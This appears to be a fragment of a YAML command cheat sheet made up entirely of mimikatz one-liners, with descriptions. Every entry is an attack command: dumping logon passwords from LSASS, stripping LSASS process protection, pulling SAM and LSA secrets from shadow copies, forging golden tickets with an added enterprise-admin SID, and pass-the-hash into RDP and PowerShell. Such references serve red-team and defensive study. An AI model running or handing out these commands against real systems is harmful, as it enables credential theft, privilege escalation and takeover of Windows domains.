...
examples:
- description: mimikatz one liner
  command: mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\"
    \"lsadump::sam\" \"exit\"
...
- description: mimikatz disable ppl and dump password
  command: mimikatz.exe \"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe
    /remove\" \"sekurlsa::logonpasswords\" \"exit\"
- description: mimikatz extract credentials from dump
  command: mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\"
    \"exit\"
- description: mimikatz extract credentials from shadow copy (1)
  command: mimikatz.exe \"lsadump::sam /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM
...
- description: mimikatz extract credentials from shadow copy (2)
  command: mimikatz.exe \"lsadump::secrets /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM
    /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\"
...
- description: mimikatz - forest extra SID
  command: kerberos::golden /user:[user] /domain:[domain] /sid:[child_sid] /krbtgt:[krbtgt_ntlm]
    /sids:[parent_sid]-519 /ptt
- description: mimikatz pth to RDP mstsc.exe
  command: sekurlsa::pth /user:[user] /domain:<domain> /ntlm:<ntlm_hash> /run:\"mstsc.exe
    /restrictedadmin\"
- description: mimikatz pth run powershell remotelly
  command: sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[ntlm_hash] /run:\"powershell.exe
    -exec bypass\"
references:
- label: Source
